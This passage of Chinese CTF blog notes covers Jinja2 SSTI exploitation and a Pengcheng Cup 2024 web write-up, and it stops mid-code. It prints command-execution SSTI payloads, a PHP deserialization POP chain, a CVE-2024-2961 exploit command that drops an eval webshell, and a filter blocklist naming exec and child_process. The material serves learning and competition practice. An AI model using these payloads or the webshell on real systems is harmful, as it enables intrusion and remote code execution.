class="comment"># jinja2模板使用示例</span></span><br><span class="line"><span class="comment"># 1. 模板文件 template.html，在/templates/目录下</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&#123;&#123; title &#125;&#125;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;&#123;&#123; heading &#125;&#125;&lt;/h1&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">        &#123;% <span class="keyword">for</span> item <span class="keyword">in</span> items %&#125;</span><br><span class="line">            &lt;li&gt;&#123;&#123; item &#125;&#125;&lt;/li&gt;</span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 文件: template.py</span></span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Environment, FileSystemLoader</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定模板文件所在的目录</span></span><br><span class="line">file_loader = FileSystemLoader(<span class="string">&#x27;templates&#x27;</span>)</span><br><span class="line"><span class="comment"># 创建环境</span></span><br><span class="line">env = Environment(loader=file_loader)</span><br><span class="line"><span class="comment"># 加载模板</span></span><br><span class="line">template = env.get_template(<span class="string">&#x27;template.html&#x27;</span>)</span><br><span class="line"><span class="comment"># 定义要传递给模板的数据</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;title&#x27;</span>: <span class="string">&#x27;My Page&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;heading&#x27;</span>: <span class="string">&#x27;Welcome to My Page&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;items&#x27;</span>: [<span class="string">&#x27;Item 1&#x27;</span>, <span class="string">&#x27;Item 2&#x27;</span>, <span class="string">&#x27;Item 3&#x27;</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 渲染模板</span></span><br><span class="line">output = template.render(data)</span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h3 id="ssti漏洞利用"><a href="#ssti漏洞利用" class="headerlink" title="ssti漏洞利用"></a>ssti漏洞利用</h3><h4 id="类型一-基类找模块"><a href="#类型一-基类找模块" class="headerlink" title="类型一: 基类找模块"></a>类型一: 基类找模块</h4><ol><li><strong>基本思路</strong><ol><li>拿基类 -&gt; 找子类 -&gt; 构造命令执行或者文件读取负载 -&gt; 拿 flag</li><li>思想: 获取含有目标方法的模块中的类，然后获取类<code>__globals__</code>来获取目标方法(本质上是要找模块)</li></ol></li><li>下面是一些常用的构造链的示例，接下来的每一部分都会进行解释</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">194</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h5 id="获取基类"><a href="#获取基类" class="headerlink" title="获取基类"></a>获取基类</h5><ol><li>常用魔术方法<ol><li>关于<code>__bases__</code>: <strong>元组</strong>，该属性只存在于类对象中，而不是类的实例对象中，用途：查看类的继承关系，动态修改类的继承关系（<strong>记录类继承关系的</strong>）</li></ol></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 获取基类</span></span><br><span class="line">__class__   <span class="comment"># 类的一个内置属性，表示实例对象的类，其实是获取类对象</span></span><br><span class="line">__base__    <span class="comment"># 类型对象的直接基类</span></span><br><span class="line">__bases__   <span class="comment"># 类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__</span></span><br><span class="line">__mro__  <span class="comment"># 查看继承关系和调用顺序，返回元组。此属性是由类组成的元组，在方法解析期间会基于它来查找基类</span></span><br></pre></td></tr></table></figure><h5 id="寻找子类"><a href="#寻找子类" class="headerlink" title="寻找子类"></a>寻找子类</h5><ol><li>这里只用到一个重点函数，那就是<code>__subclasses__()</code>，<strong>获取所有子类列表</strong><ol><li>该方法只存在于类对象中，而不是类的实例对象中</li><li>这部分的重心不在子类本身上，而是在子类是否有 os 或者 file 的相关模块可以被调用上 –&gt; <strong>命令执行</strong>或者<strong>文件读取</strong></li></ol></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__base__.__subclasses__()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>]__subclasses__()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__mro__[-<span class="number">1</span>].__subclasses__()</span><br></pre></td></tr></table></figure><h5 id="命令执行"><a href="#命令执行" class="headerlink" title="*命令执行"></a>*命令执行</h5><ol><li><p>这里使用到的内置函数和原型链污染的利用函数很多类似，这里是粘贴《Python原型链污染》的，详见这部分的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__globals__ <span class="comment"># 5. 与函数和方法对象相关联，全局信息存在字典里，只读字典</span></span><br><span class="line">   <span class="comment"># ref: https://docs.python.org/3/reference/datamodel.html</span></span><br><span class="line"></span><br><span class="line">__init__ <span class="comment"># 6. 初始化类，返回的类型是function</span></span><br><span class="line">    <span class="comment"># 关于.__init__.__globals__实际上是通过函数访问全局变量而不是初始化实例</span></span><br><span class="line"></span><br><span class="line">__builtins__ <span class="comment"># 7. 内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__import__</span> <span class="comment"># 8. 内置方法: 动态导入模块</span></span><br><span class="line">     <span class="comment"># 调用示例</span></span><br><span class="line">     odule_name = <span class="string">&#x27;os&#x27;</span></span><br><span class="line">     os_module = <span class="built_in">__import__</span>(module_name)</span><br><span class="line">     <span class="built_in">print</span>(os_module.getcwd())  <span class="comment"># 输出当前工作目录</span></span><br></pre></td></tr></table></figure></li><li><p>常常用来rce或者读文件的模块<img src="/pic/Flask_ssti/executeClass.png" alt="常常用来rce或者读文件的模块"></p><ol><li>补充一点思路<ol><li><em><strong>别人探索出来的链和模块</strong></em></li><li>可以多关注一下内置函数，python有文档详细的进行了记录</li></ol></li><li>详见helloctf<a href="https://hello-ctf.com/HC_Web/ssti/#_8">hellocf</a></li></ol></li></ol><h5 id="自动化查找"><a href="#自动化查找" class="headerlink" title="自动化查找"></a>自动化查找</h5><ol><li><p>利用模板语言</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 模板语法 _ 命令执行_eval</span></span><br><span class="line">&#123;% <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> x.__init__ <span class="keyword">is</span> defined <span class="keyword">and</span> x.__init__.__globals__ <span class="keyword">is</span> defined <span class="keyword">and</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>].__name__ %&#125;</span><br><span class="line">        &#123;&#123; x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure></li><li><p>利用python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 python 脚本 用于寻找序号</span></span><br><span class="line">url = <span class="string">&quot;http://url/level/1&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_eval</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;code&#x27;</span>: <span class="string">&quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__.__globals__[&#x27;__builtins__&#x27;]&#125;&#125;&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url, data=data, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(data)</span><br><span class="line">find_eval(url)</span><br></pre></td></tr></table></figure></li></ol><h4 id="类型二-直接找模块"><a href="#类型二-直接找模块" class="headerlink" title="类型二: 直接找模块"></a>类型二: 直接找模块</h4><h3 id="ssti绕过"><a href="#ssti绕过" class="headerlink" title="ssti绕过"></a>ssti绕过</h3><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li><a href="https://hello-ctf.com/HC_Web/ssti/">hello_ctf，0基础入门</a></li><li><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">概念入门</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pcb24</title>
      <link href="/2024/11/10/pcb24/"/>
      <url>/2024/11/10/pcb24/</url>
      
        <content type="html"><![CDATA[<blockquote><p>复现后感觉都不是很难，比赛时还是要多看看<br>还得练，不过最近高强度打比赛来说成长很快，也是差不多找到做题的感觉了，不过在做题中还是有点急，明明静下来更快的(<br>自知愚钝，日月兼程</p></blockquote><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li><a href="https://err0r233.github.io/posts/10200.html">2024鹏城杯线上赛Web方向题解，这个大跌ak了？</a></li></ol><h2 id="fileread-php-cve"><a href="#fileread-php-cve" class="headerlink" title="fileread: php, cve"></a>fileread: php, cve</h2><ol><li><p>源码如下</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cls1</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cls</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$arr</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable language_">$this</span>-&gt;arr <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;cls-&gt;<span class="variable">$v</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cls2</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$filename</span> = <span class="string">&#x27;hello.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$txt</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">           <span class="title function_ invoke__">var_dump</span>(<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="string">&#x27;fileput&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fileput</span>();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&lt;p&gt;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$key</span>).<span class="string">&#x27;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fileput</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Your file:&#x27;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_GET</span>))&#123;</span><br><span class="line">    <span class="variable">$cls</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ser&#x27;</span>]);</span><br><span class="line">    <span class="variable">$instance</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$cls</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">cls1</span>();</span><br><span class="line">    <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>构造一下pop链拿到file_get_contents()</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">cls1</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt; arr = <span class="keyword">array</span>(<span class="string">&quot;fileput&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">cls2</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt; cls = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line"><span class="keyword">echo</span> base64-<span class="title function_ invoke__">encode</span>(<span class="variable">$res</span>)</span><br></pre></td></tr></table></figure></li><li><p>这里是在大哥b1nb1n的查阅下知道要用一个cve的，其实我也有一个想法 –&gt; <em><strong>当操作受限时需要到rce时就需要找切入点了，从最显目的出发，有一个是一个就好，查一查又没有关系!!!</strong></em>: php file_get_contents rce就可以搜索得到这个漏洞</p><ol><li>CVE-2024-2961，有配套脚本，适用于file_get_contents()，需要改一改，这底层不像是web的bro，更像是pwn的，原理有点高深<ol><li>利用思路：利用脚本执行了三个请求：首先下载&#x2F;proc&#x2F;self&#x2F;maps文件，并从中提取PHP堆的地址和libc库的文件名。接着下载libc二进制文件来提取system()函数的地址。最后执行一次最终请求来触发溢出并执行预设的任意命令</li><li><a href="https://www.ambionics.io/blog/iconv-cve-2024-2961-p1">原作者底层原理</a></li><li><a href="https://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py">官方脚本地址</a> –&gt; 改的在CtfSpt History里，总结就是慢慢看</li><li><a href="https://chenxi9981.github.io/ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/">另一个人的脚本</a></li><li><a href="https://xz.aliyun.com/t/15549?time__1311=Gqjxn7itGQeWqGNDQiiQGkDuWgqOSGG0bD">别人的总结，看慢点bro，建议和官方脚本一起使用</a></li></ol></li><li>补充：据原作者描述该漏洞影响PHP 7.0.0 (2015) 到 8.3.7 (2024)近十年php版本的任何php应用程序（Wordpress、Laravel 等）。PHP的所有标准文件读取操作都受到了影响：file_get_contents()、file()、readfile()、fgets()、getimagesize()、SplFileObject-&gt;read()等。文件写入操作同样受到影响（如file_put_contents()及其同类函数）</li></ol></li><li><p>触发<code>python3 cnext-exploit.py http://192.168.18.24/ &quot;echo &#39;&lt;?php eval(\$_POST[\&quot;aaa\&quot;])?&gt;&#39; &gt; kc1zs4.php&quot;</code></p></li><li><p>然后是通过<code>ls -al /</code>查suid &#x2F;readflag</p></li></ol><h2 id="notadmin-复现-node-merge"><a href="#notadmin-复现-node-merge" class="headerlink" title="notadmin(复现): node merge"></a>notadmin(复现): node merge</h2><blockquote><p>比较可惜，差一点点就出来了，不会很难的一道题</p></blockquote><ol><li><p>附件中有源码</p><ol><li>一眼原型链污染？有hasOwnProperty()无法访问到原型，直接赋值了，不符合利用条件</li><li>crypto随机数非伪随机数</li></ol> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&quot;body-parser&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&quot;jsonwebtoken&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> &#123; <span class="title class_">User</span> &#125; = <span class="built_in">require</span>(<span class="string">&quot;./user&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&quot;crypto&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&quot;view engine&quot;</span>, <span class="string">&quot;ejs&quot;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&quot;views&quot;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&quot;views&quot;</span>));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">&quot;public&quot;</span>));</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> tmp_user = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">authenticateToken</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> authHeader = req.<span class="property">headers</span>[<span class="string">&quot;authorization&quot;</span>];</span><br><span class="line">    <span class="keyword">const</span> token = authHeader;</span><br><span class="line">    <span class="keyword">if</span> (tmp_user.<span class="property">secretKey</span> == <span class="literal">undefined</span>) &#123;</span><br><span class="line">        tmp_user.<span class="property">secretKey</span> = crypto.<span class="title function_">randomBytes</span>(<span class="number">16</span>).<span class="title function_">toString</span>(<span class="string">&quot;hex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!token) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> decoded = jwt.<span class="title function_">verify</span>(token, tmp_user.<span class="property">secretKey</span>);</span><br><span class="line">        req.<span class="property">user</span> = decoded;</span><br><span class="line">        <span class="title function_">next</span>();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ex) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&quot;Invalid token.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> c <span class="keyword">in</span> b) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(b[c]));</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">check</span>(b[c])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (</span><br><span class="line">                a.<span class="title function_">hasOwnProperty</span>(c) &amp;&amp;</span><br><span class="line">                b.<span class="title function_">hasOwnProperty</span>(c) &amp;&amp;</span><br><span class="line">                <span class="keyword">typeof</span> a[c] === <span class="string">&quot;object&quot;</span> &amp;&amp;</span><br><span class="line">                <span class="keyword">typeof</span> b[c] === <span class="string">&quot;object&quot;</span></span><br><span class="line">            ) &#123;</span><br><span class="line">                <span class="title function_">merge</span>(a[c], b[c]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                a[c] = b[c];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(tmp_user.<span class="property">secretKey</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> check = <span class="keyword">function</span> (<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> input =</span><br><span class="line">        <span class="regexp">/const|var|let|return|subprocess|Array|constructor|load|push|mainModule|from|buffer|process|child_process|main|require|exec|this|eval|while|for|function|hex|char|base|&quot;|&#x27;|\\|\[|\+|\*/gi</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> str === <span class="string">&quot;object&quot;</span> &amp;&amp; str !== <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> str) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_">check</span>(key)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_">check</span>(str[key])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> !input.<span class="title function_">test</span>(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/login&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&quot;login&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/login&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">merge</span>(tmp_user, req.<span class="property">body</span>)) &#123;</span><br><span class="line">        <span class="comment">// 直接污染secretKey就有了，但是下面要verifyLogin，而且merege中进行了过滤</span></span><br><span class="line">        <span class="keyword">if</span> (tmp_user.<span class="property">secretKey</span> == <span class="literal">undefined</span>) &#123;</span><br><span class="line">            tmp_user.<span class="property">secretKey</span> = crypto.<span class="title function_">randomBytes</span>(<span class="number">16</span>).<span class="title function_">toString</span>(<span class="string">&quot;hex&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">User</span>.<span class="title function_">verifyLogin</span>(tmp_user.<span class="property">password</span>)) &#123;</span><br><span class="line">            <span class="keyword">const</span> token = jwt.<span class="title function_">sign</span>(</span><br><span class="line">                &#123; <span class="attr">username</span>: tmp_user.<span class="property">username</span> &#125;,</span><br><span class="line">                tmp_user.<span class="property">secretKey</span></span><br><span class="line">            );</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">`Login successful! Token: <span class="subst">$&#123;token&#125;</span>\nBut nothing happend~`</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;Login failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;Hacker denied!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">authenticateToken</span>(req, res, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        backcode 